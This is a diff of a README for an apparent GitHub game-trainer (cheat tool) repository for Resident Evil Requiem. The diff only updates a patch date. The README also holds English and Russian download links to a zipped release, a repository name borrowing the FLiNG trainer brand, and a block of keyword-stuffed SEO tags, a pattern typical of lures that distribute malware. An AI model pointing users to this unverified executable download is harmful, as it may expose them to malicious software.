@@ -22,8 +22,8 @@
 </div>
 
 # Professional Game Trainer for Resident Evil Requiem (RE9) V 1.0.7
-- Updated for the current game patch 03.03.2026
-- Обновлено под актуальный патч игры 03.03.2026
+- Updated for the current game patch 05.03.2026
+- Обновлено под актуальный патч игры 05.03.2026
 - Компилирования версия - https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip
 - Compiling version - https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip
 
@@ -333,3 +333,4 @@ re9 trainer v1.0 steam
 resident evil requiem fearless revolution  
 
 resident-evil-requiem, resident-evil-requiem-cheats, re9-trainer, requiem-fling, fling-trainer-requiem, god-mode-re9, infinite-health-re9, infinite-ammo-re9, no-recoil-re9, rapid-fire-re9, super-accuracy-requiem, infinite-grenades-re9, weapon-durability-re9, highlight-interactables-requiem, super-damage-re9, one-hit-kill-re9, unlock-extras-requiem, edit-cp-re9, pc-cheats-requiem, survival-horror-trainer
+
